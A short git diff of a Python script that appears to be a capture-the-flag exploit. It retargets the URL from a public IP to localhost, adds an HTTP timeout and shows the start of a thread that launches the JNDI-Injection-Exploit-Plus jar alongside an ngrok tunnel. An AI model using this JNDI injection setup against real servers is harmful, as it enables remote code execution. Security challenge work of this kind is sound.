@@ -4,18 +4,18 @@ from pyngrok.ngrok import connect, disconnect
 from threading import Thread
 from subprocess import check_output
 
-URL = "http://139.59.99.85:30011/"
+URL = "http://localhost:7534/"
 
 class BaseAPI:
     def __init__(self, url=URL) -> None:
-        self.c = httpx.AsyncClient(base_url=url)
+        self.c = httpx.AsyncClient(base_url=url, timeout=100)
 
 class API(BaseAPI):
     ...
 
 async def main():
-    # must use java 11
     api = API()
+    # must use java 11
     t = Thread(target=check_output, args=([
         'java',
         '-jar', 'Java-Exploit-Plus/target/JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar',
